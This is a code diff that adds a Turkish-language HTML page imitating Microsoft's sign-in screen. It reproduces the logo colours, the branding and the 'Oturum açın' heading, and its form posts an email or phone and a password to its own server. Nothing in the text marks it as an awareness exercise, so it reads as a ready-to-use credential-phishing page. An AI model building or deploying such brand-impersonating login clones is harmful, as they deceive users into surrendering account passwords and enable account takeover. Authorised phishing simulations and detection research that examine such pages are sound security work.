@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Oturum Açın – Microsoft</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f2f2f2;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            background: #fff;
+            width: 440px;
+            min-height: 338px;
+            padding: 44px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+        }
+        .ms-logo {
+            display: flex;
+            gap: 3px;
+            margin-bottom: 16px;
+        }
+        .ms-logo div { width: 10px; height: 10px; }
+        .ms-logo .r { background: #f25022; }
+        .ms-logo .g { background: #7fba00; }
+        .ms-logo .b { background: #00a4ef; }
+        .ms-logo .y { background: #ffb900; }
+        .ms-logo-grid {
+            display: grid;
+            grid-template-columns: 10px 10px;
+            gap: 2px;
+        }
+        .title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 24px;
+        }
+        .form-group { margin-bottom: 16px; }
+        .form-group input {
+            width: 100%;
+            padding: 6px 10px;
+            border: none;
+            border-bottom: 1px solid #666;
+            font-size: 15px;
+            outline: none;
+            background: transparent;
+        }
+        .form-group input:focus {
+            border-bottom: 2px solid #0067b8;
+        }
+        .form-group input::placeholder { color: #666; }
+        .link-forgot {
+            display: block;
+            color: #0067b8;
+            text-decoration: none;
+            font-size: 13px;
+            margin: 16px 0;
+        }
+        .link-forgot:hover { text-decoration: underline; color: #005da6; }
+        .btn-submit {
+            background: #0067b8;
+            color: #fff;
+            border: none;
+            width: 100%;
+            padding: 10px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .btn-submit:hover { background: #005da6; }
+        .separator {
+            text-align: center;
+            color: #1b1b1b;
+            font-size: 13px;
+            margin: 16px 0;
+        }
+        .footer-links {
+            display: flex;
+            gap: 4px;
+            font-size: 13px;
+            margin-top: 16px;
+        }
+        .footer-links span { color: #1b1b1b; }
+        .footer-links a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+        .footer-links a:hover { text-decoration: underline; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="ms-logo">
+            <div class="ms-logo-grid">
+                <div class="r"></div>
+                <div class="g"></div>
+                <div class="b"></div>
+                <div class="y"></div>
+            </div>
+            <span style="font-size:20px; font-weight:600; color:#5e5e5e; margin-left:6px;">Microsoft</span>
+        </div>
+        <h1 class="title">Oturum açın</h1>
+        <form action="/" method="post">
+            <div class="form-group">
+                <input type="text" name="kullanici" placeholder="E-posta, telefon veya Skype" required>
+            </div>
+            <div class="form-group">
+                <input type="password" name="sifre" placeholder="Şifre" required>
+            </div>
+            <a href="#" class="link-forgot">Hesabınıza erişemiyor musunuz?</a>
+            <button type="submit" class="btn-submit">Oturum aç</button>
+        </form>
+        <div class="separator">veya</div>
+        <div class="footer-links">
+            <span>Hesabınız yok mu?</span>
+            <a href="#">Oluşturun!</a>
+        </div>
+    </div>
+</body>
+</html>
